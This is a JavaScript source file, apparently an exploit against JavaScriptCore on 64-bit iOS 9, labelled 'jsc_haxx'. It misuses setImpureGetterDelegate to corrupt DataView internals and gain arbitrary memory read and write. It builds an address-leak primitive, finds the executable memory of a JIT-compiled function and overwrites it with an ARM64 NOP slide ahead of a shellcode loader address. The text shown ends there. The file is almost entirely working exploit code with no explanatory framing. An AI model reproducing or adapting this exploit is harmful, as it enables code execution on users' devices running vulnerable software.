const DV_ARRAYBUFFER_OFFSET = 0x10;
const DV_BYTELENGTH_OFFSET_HI = DV_ARRAYBUFFER_OFFSET + 0x4;
const DV_BYTELENGTH_OFFSET_LO = DV_ARRAYBUFFER_OFFSET + 0x8;
const DV_MODE_OFFSET = DV_BYTELENGTH_OFFSET_HI + 0x8;
const FAST_TYPED_ARRAY_MODE = 0x0;

var Utils = function() {
    this.print = function(msg) { debug(msg) }; 
    this.hex32 = function(num) {
        var hex_str = num.toString(16);
        while (hex_str.length < 8) {
            hex_str = '0' + hex_str;
        }
        return hex_str;
    }

    this.quit_jsc = function() {
        var quit = JSC_HAXX;
    }
};

var Memory = function() {
    this.dv_leak_addr = undefined;
    this.dv_leak = undefined;
    this.dv_rw = undefined;

    this.test_rw = function() {
        var test_buf = new ArrayBuffer(0x10);
        var buf_addr = this.addrof(test_buf)
        if (buf_addr <= 0xfff) return false;

        this.write32(buf_addr, 0x13374141);
        var read_back = this.read32(buf_addr);
        return read_back === 0x13374141;
    }

    this.init_rw = function() {
        var rw_buf = new ArrayBuffer(0x20);
        var dv_init = new DataView(rw_buf);
        this.dv_rw = new DataView(rw_buf);

        setImpureGetterDelegate(dv_init, this.dv_rw);
        dv_init.setUint32(DV_ARRAYBUFFER_OFFSET, 0, true);
        dv_init.setUint32(DV_BYTELENGTH_OFFSET_HI, 0x00000001, true);
        dv_init.setUint32(DV_BYTELENGTH_OFFSET_LO, 0xffffffff, true);
        dv_init.setUint32(DV_MODE_OFFSET, FAST_TYPED_ARRAY_MODE, true);

        var rw_buf = new ArrayBuffer(0x20);
        this.dv_leak_addr = new DataView(rw_buf);
        this.dv_leak = new DataView(rw_buf);
        setImpureGetterDelegate(this.dv_leak, this.dv_leak_addr);
    }

    this.addrof = function(object) {
        if (this.dv_leak === undefined || this.dv_leak_addr === undefined) return 0;
        setImpureGetterDelegate(this.dv_leak_addr, object);
        return this.dv_leak.getUint32(DV_ARRAYBUFFER_OFFSET, true);
    }

    this.read8 = function(addr) { return this.dv_rw.getUint8(addr, true); }
    this.read16 = function(addr) { return this.dv_rw.getUint16(addr, true); }
    this.read32 = function(addr) { return this.dv_rw.getUint32(addr, true); }

    this.write8 = function(addr, data) { this.dv_rw.setUint8(addr, data, true); }
    this.write16 = function(addr, data) { this.dv_rw.setUint16(addr, data, true); }
    this.write32 = function(addr, data) { this.dv_rw.setUint32(addr, data, true); }
}

var util = new Utils();
var mem = new Memory();

util.print("[*] jsc_haxx ios 9 (64bit) [*]");

mem.init_rw();
if (!mem.test_rw()) {
    util.print("failed to get rw, bailing...");
    util.quit_jsc();
}

util.print("got jsc rw");

var body = '';
for (var k = 0; k < 0x2000; k++){
	body += 'try {} catch(e){};';
}

var jitted_func = new Function('a', body);
for (var i = 0; i< 0x200; i++){
	jitted_func();
}

var jitted_addr = mem.addrof(jitted_func);
if (jitted_addr <= 0xfff) { util.quit_jsc(); }
util.print("jitted_func: 0x1" + util.hex32(jitted_addr));

var shellcode_ptr = mem.read32(jitted_addr+0x18);
if (shellcode_ptr <= 0xfff) { util.quit_jsc(); }
util.print("shellcode_ptr: 0x1" + util.hex32(shellcode_ptr));

var nop_slide = (mem.read32(shellcode_ptr+0x20)) - 0x562c;
if (nop_slide <= 0xfff) { util.quit_jsc(); }
util.print("nop_slide: 0x1" + util.hex32(nop_slide));

for (var i = 0; i < 0x1000; i+=0x4){
    mem.write32(nop_slide + i, 0xd503201f);
}

var shellcode = (nop_slide & 0xfffff000) + 0x1000;
util.print("loader_shc: 0x1" + util.hex32(shellcode));

